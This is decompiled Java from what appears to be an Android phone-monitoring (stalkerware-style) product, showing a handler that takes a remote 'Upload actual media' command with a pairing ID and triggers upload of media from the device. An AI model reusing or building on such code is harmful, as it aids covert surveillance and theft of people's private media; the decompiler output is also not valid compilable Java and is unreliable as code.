package com.vvt.remotecommand.processor.d;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class h
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public h(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    localObject1 = (String)((ArrayList)localObject1).get(0);
    int j = Integer.parseInt((String)localObject1);
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    ((StringBuilder)localObject2).append("Upload actual media command is being processed.\n");
    ((StringBuilder)localObject2).append("You will be receiving the result when it completes.\n");
    Object localObject3 = new Object[i];
    Integer localInteger = Integer.valueOf(j);
    localObject3[0] = localInteger;
    Object localObject4 = String.format("Pairing ID: %s", (Object[])localObject3);
    ((StringBuilder)localObject2).append((String)localObject4);
    localObject2 = ((StringBuilder)localObject2).toString();
    boolean bool3 = a;
    if (bool3) {}
    paramc.a(paramRemoteCommand, this, (String)localObject2);
    boolean bool4 = a;
    if (bool4) {}
    localObject2 = h();
    localObject4 = new com/vvt/remotecontrol/ControlCommand;
    localObject3 = RemoteFunction.UPLOAD_ACTUAL_MEDIA;
    localObject1 = Integer.valueOf(j);
    ((ControlCommand)localObject4).<init>((RemoteFunction)localObject3, localObject1);
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject4);
    if (paramc != null)
    {
      bool2 = localObject2 instanceof RmtCtrlOutputStatusMessage;
      if (bool2)
      {
        localObject1 = localObject2;
        localObject1 = (RmtCtrlOutputStatusMessage)localObject2;
        bool2 = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        bool3 = a;
        if ((bool3) && (!bool2)) {
          break label269;
        }
        bool2 = false;
        localObject1 = null;
        paramc.b(paramRemoteCommand, this, null);
      }
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      return;
      label269:
      localObject2 = (RmtCtrlOutputStatusMessage)localObject2;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
      if (localObject1 != null)
      {
        int k = ((String)localObject1).length();
        if (k > i)
        {
          boolean bool5 = a;
          if (bool5) {}
          localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject2).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
          continue;
        }
      }
      bool2 = a;
      if (bool2) {}
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
    }
  }
  
  void a(ArrayList paramArrayList)
  {
    boolean bool1 = a;
    if (bool1) {}
    int i = paramArrayList.size();
    int j = 1;
    Object localObject;
    if (i != j)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      for (;;)
      {
        boolean bool2 = localIterator.hasNext();
        if (!bool2) {
          break;
        }
        localObject = localIterator.next();
        localObject = (String)localObject;
        Integer.parseInt((String)localObject);
      }
      InvalidCommanFormatException localInvalidCommanFormatException;
      return;
    }
    catch (NumberFormatException localNumberFormatException)
    {
      localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Upload actual media";
  }
  
  public boolean f()
  {
    return false;
  }
  
  public long g()
  {
    return 60000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/d/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */